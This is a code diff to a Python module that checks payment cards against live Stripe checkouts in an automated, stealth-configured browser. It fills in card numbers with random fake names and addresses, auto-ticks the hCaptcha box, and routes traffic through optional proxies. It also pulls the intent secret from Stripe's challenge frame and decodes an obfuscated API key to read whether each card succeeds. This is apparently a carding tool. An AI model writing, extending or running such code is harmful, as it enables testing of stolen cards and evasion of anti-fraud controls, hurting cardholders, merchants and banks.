@@ -6,23 +6,24 @@ The second belongs to the payment intent, it puts up a box that has to
 be ticked, and it is the one the payment intent is waiting for.
 
 When the card is put into the page by hand, stripe's own script does
-all of it: it puts up the captcha, it ticks nothing and waits, it
-hands the answer over, and it takes the card through the bank.  That is
-the whole way round, and it is the only way round that the bank
-believes.
+all of it: it puts up the captcha, it hands the answer over, and it
+takes the card through the bank.  That is the whole way round, and it
+is the only way round that the bank believes.
 
-So the card is put into the page by hand here, and the answer is read
-off the wire.
+So the card is put into the page by hand here, the box is ticked when
+it shows, and the card is read from stripe's own frame, which says
+which intent it is about.
 """
 
 import asyncio
+import base64
 import json
 import logging
 import os
 import random
 import re
-import sys
 import time
+from urllib.parse import unquote
 
 logger = logging.getLogger("stripe_native")
 
@@ -55,15 +56,28 @@ def _name():
     return first, last
 
 
-def _email(first, last):
-    return ("%s.%s%d" % (first.lower(), last.lower(), random.randint(10, 9999))
-            + "@gmail.com")
-
-
 def _street():
     number = random.randint(10, 9999)
     name = random.choice(THE_STREETS)
     return "%d %s" % (number, name)
+
+
+def the_key_of(link):
+    """The key that goes with the link, out of the part after the #.
+
+    The part after the # holds the key, turned a little so it cannot be
+    read by accident.
+    """
+    try:
+        if "#" not in link:
+            return ""
+        raw = unquote(link.split("#", 1)[1])
+        padded = raw + "=" * (-len(raw) % 4)
+        turned = base64.b64decode(padded)
+        text = "".join(chr(b ^ 5) for b in turned)
+        return (json.loads(text) or {}).get("apiKey") or ""
+    except Exception:
+        return ""
 
 
 # The country is a list that stripe keeps in a box of its own, and it is
@@ -128,47 +142,72 @@ TICK_THE_BOX = """
 }
 """
 
+# Stripe's own frame for the challenge of the intent.  Its address says
+# which intent it is about, and it holds the key and the request data
+# of the challenge.
+THE_INTENT_FRAME = "hcaptcha-inner"
 
-def _is_the_box_frame(url):
-    return "hcaptcha.com/captcha" in (url or "") and "frame=checkbox" in (url or "")
+# The browser of the checkout has a profile of its own.  The browser
+# that answers the captcha has one too, and two browsers cannot hold
+# the same one at the same time.
+THE_PROFILE = "/tmp/lc_checkout_profile"
 
 
-class _Answers:
-    """What stripe said on the wire."""
+def _the_profile():
+    """The profile of the checkout's own browser."""
+    path = THE_PROFILE
+    try:
+        os.makedirs(path, exist_ok=True)
+    except Exception:
+        return "/tmp"
+    return path
 
-    def __init__(self):
-        self.list = []
 
-    async def take(self, response):
-        url = response.url or ""
-        if "api.stripe.com" not in url:
-            return
-        if not any(k in url for k in ("payment_intents", "setup_intents",
-                                      "verify_challenge", "confirm")):
-            return
-        body = ""
-        try:
-            body = await response.text()
-        except Exception:
-            pass
-        self.list.append((response.status, url, body))
+def _clear_the_lock():
+    """Take the lock of a browser that died away."""
+    try:
+        for name in ("SingletonLock", "SingletonCookie", "SingletonSocket"):
+            full = os.path.join(_the_profile(), name)
+            if os.path.islink(full) or os.path.exists(full):
+                try:
+                    os.unlink(full)
+                except OSError:
+                    pass
+    except Exception:
+        pass
 
-    def the_intents(self):
-        """Every answer that carried an intent, the newest last."""
-        out = []
-        for status, url, body in self.list:
-            try:
-                data = json.loads(body)
-            except Exception:
+
+def _the_intent_in_the_frames(page):
+    """The intent stripe's own frame is about, if it is there.
+
+    The frame's address carries the intent, its secret, and the address
+    the answer is handed to.
+    """
+    for frame in page.frames:
+        url = frame.url or ""
+        if THE_INTENT_FRAME not in url:
+            continue
+        tail = url.split("#", 1)[-1]
+        found = {}
+        for part in tail.split("&"):
+            if "=" not in part:
                 continue
-            if not isinstance(data, dict):
-                continue
-            intent = data.get("payment_intent") or {}
-            if not intent and data.get("object") in ("payment_intent", "setup_intent"):
-                intent = data
-            if intent:
-                out.append((status, url, intent))
-        return out
+            name, value = part.split("=", 1)
+            found[name] = unquote(value)
+        intent_id = found.get("intentId") or ""
+        if not intent_id:
+            continue
+        verify = found.get("verifyUrl") or ""
+        if verify and not verify.startswith("/"):
+            verify = "/" + verify
+        return {
+            "intent_id": intent_id,
+            "client_secret": found.get("clientSecret") or "",
+            "site_key": found.get("sitekey") or "",
+            "rqdata": found.get("rqdata") or "",
+            "verify_url": verify,
+        }
+    return None
 
 
 def _classify(intent):
@@ -230,6 +269,44 @@ def _card_info(intent):
     return "%s %s" % (brand.upper(), last).strip()
 
 
+async def _read_the_intent(client, pk, intent_id, client_secret):
+    """The intent, read from stripe."""
+    try:
+        r = await client.get(
+            "https://api.stripe.com/v1/payment_intents/%s" % intent_id,
+            params={"key": pk, "client_secret": client_secret},
+            headers={"origin": "https://checkout.stripe.com",
+                     "referer": "https://checkout.stripe.com/"},
+            timeout=12)
+        data = r.json()
+        return data if isinstance(data, dict) else {}
+    except Exception as e:
+        logger.info("the intent could not be read: %s", e)
+        return {}
+
+
+def _the_intent_in_the_wire(seen):
+    """The intent out of what stripe said on the wire.
+
+    Stripe's own script says what happened to the intent in its answer
+    to the confirm.  The answer is the truth about the card.
+    """
+    best = None
+    for status, url, body in seen:
+        try:
+            data = json.loads(body)
+        except Exception:
+            continue
+        if not isinstance(data, dict):
+            continue
+        intent = data.get("payment_intent") or {}
+        if not intent and data.get("object") in ("payment_intent", "setup_intent"):
+            intent = data
+        if intent:
+            best = intent
+    return best
+
+
 async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
     """The card in the real checkout, in a real browser.
 
@@ -238,9 +315,10 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
     it took.
     """
     started = time.time()
+    seen = []
     try:
-        from local_hcaptcha_solver import (PAGE_OPTIONS, STEALTH, _profile_dir,
-                                           _clear_the_lock, _playwright_proxy,
+        from local_hcaptcha_solver import (PAGE_OPTIONS, STEALTH,
+                                           _playwright_proxy,
                                            apply_browser_identity, client_hints_metadata)
     except Exception as e:
         logger.info("the browser helpers are missing: %s", e)
@@ -252,6 +330,8 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
         logger.info("playwright is missing: %s", e)
         return "error", "The browser is not available", "", 0.0
 
+    from browser_identity import BrowserClient
+
     launch = {
         "headless": not bool(os.environ.get("DISPLAY")),
         "args": ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
@@ -262,14 +342,18 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
     if pw_proxy:
         launch["proxy"] = pw_proxy
 
-    answers = _Answers()
+    pk = the_key_of(checkout_url)
+    client_kwargs = {"timeout": 15, "follow_redirects": True, "proxy": None}
+    if proxy and proxy != "NONE":
+        client_kwargs["proxy"] = proxy
+
     pw = None
     ctx = None
     try:
         pw = await async_playwright().start()
         try:
             ctx = await pw.chromium.launch_persistent_context(
-                _profile_dir(), channel="chrome", bypass_csp=True,
+                _the_profile(), channel="chrome", bypass_csp=True,
                 **PAGE_OPTIONS, **launch)
         except Exception:
             _clear_the_lock()
@@ -280,10 +364,34 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
         page = await ctx.new_page()
         if apply_browser_identity is not None:
             await apply_browser_identity(page, client_hints_metadata())
-        page.on("response", answers.take)
 
+        async def _on_response(response):
+            url = response.url or ""
+            if "api.stripe.com" not in url:
+                return
+            body = ""
+            try:
+                body = await response.text()
+            except Exception:
+                pass
+            seen.append((response.status, url, body))
+
+        page.on("response", _on_response)
+
+        logger.info("the checkout is opened: %s", checkout_url[:90])
         await page.goto(checkout_url, wait_until="domcontentloaded", timeout=45000)
         await page.wait_for_timeout(4000)
+
+        # a page that is already finished says so, and there is nothing
+        # to be done there
+        try:
+            words = " ".join((await page.evaluate(
+                "() => (document.body ? document.body.innerText : '')")).split())
+        except Exception:
+            words = ""
+        if "all done here" in words.lower() or "timed out" in words.lower():
+            logger.info("the session is finished: %s", words[:120])
+            return "error", "The session is finished", "", time.time() - started
 
         for _ in range(4):
             try:
@@ -297,7 +405,7 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
             except Exception:
                 await page.wait_for_timeout(1500)
         else:
-            logger.info("the card part of the page never came")
+            logger.info("the card part of the page never came: %s", words[:200])
             return "error", "The page did not open", "", time.time() - started
 
         first, last = _name()
@@ -332,37 +440,74 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
             said = "the press failed"
         logger.info("the pay button: %s", said)
 
+        # the box of the captcha is ticked when it shows, and the intent
+        # is read from stripe's own frame, which says which one it is
         deadline = time.time() + (timeout or THE_TIME_TO_WAIT)
         ticked = 0
-        while time.time() < deadline:
-            await page.wait_for_timeout(900)
-            for frame in page.frames:
-                if not _is_the_box_frame(frame.url):
-                    continue
+        intent = None
+        async with BrowserClient(**client_kwargs) as client:
+            while time.time() < deadline:
+                await page.wait_for_timeout(800)
+                for frame in page.frames:
+                    url = frame.url or ""
+                    if "hcaptcha.com/captcha" not in url or "frame=checkbox" not in url:
+                        continue
+                    try:
+                        did = await frame.evaluate(TICK_THE_BOX)
+                        if did == "ticked":
+                            ticked += 1
+                            logger.info("the captcha's box was ticked (%d)", ticked)
+                    except Exception:
+                        pass
+
+                if intent is None:
+                    intent = _the_intent_in_the_frames(page)
+                    if intent:
+                        logger.info("stripe's frame is about %s", intent["intent_id"])
+                if intent:
+                    read = await _read_the_intent(client, pk, intent["intent_id"],
+                                                  intent["client_secret"])
+                    if read:
+                        intent = dict(intent)
+                        intent["read"] = read
+                        state = read.get("status") or ""
+                        if state not in ("requires_action", "requires_source_action"):
+                            break
+                else:
+                    # stripe's own answer says what happened, and it
+                    # says it as soon as it knows
+                    from_the_wire = _the_intent_in_the_wire(seen)
+                    if from_the_wire:
+                        state = from_the_wire.get("status") or ""
+                        if state not in ("requires_action", "requires_source_action"):
+                            intent = {"intent_id": "", "client_secret": "",
+                                      "read": from_the_wire}
+                            break
+
+            if not intent:
+                logger.info("stripe never said which intent it was about")
+                from_the_wire = _the_intent_in_the_wire(seen)
+                if from_the_wire:
+                    logger.info("the intent came off the wire: %s", from_the_wire.get("status"))
+                    verdict, message = _classify(from_the_wire)
+                    return verdict, message, _card_info(from_the_wire), time.time() - started
                 try:
-                    did = await frame.evaluate(TICK_THE_BOX)
-                    if did == "ticked":
-                        ticked += 1
-                        logger.info("the captcha's box was ticked (%d)", ticked)
+                    words = " ".join((await page.evaluate(
+                        "() => (document.body ? document.body.innerText : '')")).split())
+                    logger.info("the page says: %s", words[:400])
                 except Exception:
                     pass
-            intents = answers.the_intents()
-            if intents:
-                status, url, intent = intents[-1]
-                if intent.get("status") not in ("requires_action", "requires_source_action"):
-                    break
+                return "error", "The page did not answer", "", time.time() - started
 
-        intents = answers.the_intents()
-        if not intents:
-            logger.info("stripe said nothing about the card")
-            return "error", "The page did not answer", "", time.time() - started
-
-        status, url, intent = intents[-1]
-        logger.info("stripe said: %s | %s", intent.get("status"), url.split("?")[0][-40:])
-        verdict, message = _classify(intent)
-        info = _card_info(intent)
-        logger.info("the verdict: %s | %s", verdict, message)
-        return verdict, message, info, time.time() - started
+            read = intent.get("read") or {}
+            if not read and intent.get("intent_id"):
+                read = await _read_the_intent(client, pk, intent["intent_id"],
+                                              intent["client_secret"])
+            logger.info("stripe said: %s", read.get("status"))
+            verdict, message = _classify(read)
+            info = _card_info(read)
+            logger.info("the verdict: %s | %s", verdict, message)
+            return verdict, message, info, time.time() - started
     except Exception as e:
         logger.warning("the checkout in the browser failed: %s", e)
         return "error", str(e)[:60], "", time.time() - started
